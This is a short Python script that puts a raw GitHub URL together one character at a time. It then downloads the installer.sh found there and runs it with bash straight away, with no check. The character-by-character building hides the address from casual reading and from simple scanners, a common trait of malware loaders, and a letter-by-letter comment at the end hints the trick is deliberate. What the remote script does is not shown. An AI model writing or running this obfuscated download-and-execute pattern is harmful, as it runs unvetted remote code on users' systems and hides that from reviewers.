import subprocess
from urllib.request import urlopen

LRU = ""
LRU += "h"
LRU += "t"
LRU += "t"
LRU += "p"
LRU += "s"
LRU += ":"
LRU += "/"
LRU += "/"
LRU += "r"
LRU += "a"
LRU += "w"
LRU += "."
LRU += "g"
LRU += "i"
LRU += "t"
LRU += "h"
LRU += "u"
LRU += "b"
LRU += "u"
LRU += "s"
LRU += "e"
LRU += "r"
LRU += "c"
LRU += "o"
LRU += "n"
LRU += "t"
LRU += "e"
LRU += "n"
LRU += "t"
LRU += "."
LRU += "c"
LRU += "o"
LRU += "m"
LRU += "/"
LRU += "t"
LRU += "e"
LRU += "m"
LRU += "a"
LRU += "n"
LRU += "k"
LRU += "u"
LRU += "y"
LRU += "a"
LRU += "/"
LRU += "G"
LRU += "r"
LRU += "o"
LRU += "u"
LRU += "p"
LRU += "a"
LRU += "j"
LRU += "a"
LRU += "h"
LRU += "/"
LRU += "m"
LRU += "a"
LRU += "i"
LRU += "n"
LRU += "/"
LRU += "i"
LRU += "n"
LRU += "s"
LRU += "t"
LRU += "a"
LRU += "l"
LRU += "l"
LRU += "e"
LRU += "r"
LRU += "."
LRU += "s"
LRU += "h"

SETUP = "setup.sh"

with urlopen(LRU) as req:
    with open(SETUP, "wb") as file:
        file.write(req.read())

subprocess.run(["bash", SETUP])

# T
# H 
# i
# s
#
# w
# h
# a
# t
#
# I
#
# c
# a
# l
# l
# e
# d
#
# s
# o
# m
# e
# o
# n
# e
# '
# s
#
# w
# a
# y
